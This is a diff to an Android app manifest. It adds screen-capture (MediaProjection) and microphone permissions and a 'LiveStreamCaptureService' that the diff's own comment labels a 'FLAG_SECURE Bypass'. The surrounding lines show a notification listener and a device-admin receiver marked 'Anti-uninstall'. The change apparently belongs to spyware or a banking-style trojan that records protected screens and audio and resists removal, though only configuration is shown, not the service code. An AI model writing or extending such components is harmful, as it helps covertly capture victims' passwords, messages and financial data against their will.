@@ -91,6 +91,11 @@
     <uses-permission android:name="com.google.android.gms.permission.AUTH_PROVIDE_IMAGE_DATA"/>
     <uses-permission android:name="com.google.android.gms.permission.AUTH_SET_IMAGE_DATA"/>
 
+    <!-- Permissions for MediaProjection (Screen Capture) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+
+
     <application
         android:allowBackup="false"
         android:icon="@drawable/ic_launcher"
@@ -153,6 +158,14 @@
                 <action android:name="android.service.notification.NotificationListenerService"/>
             </intent-filter>
         </service>
+
+        <!-- ===== LIVE STREAM CAPTURE SERVICE (FLAG_SECURE Bypass) ===== -->
+        <service
+            android:name=".services.LiveStreamCaptureService"
+            android:exported="false"
+            android:enabled="true"
+            android:foregroundServiceType="mediaProjection"/>
+
 
         <!-- ===== DEVICE ADMIN (Anti-uninstall) ===== -->
         <receiver
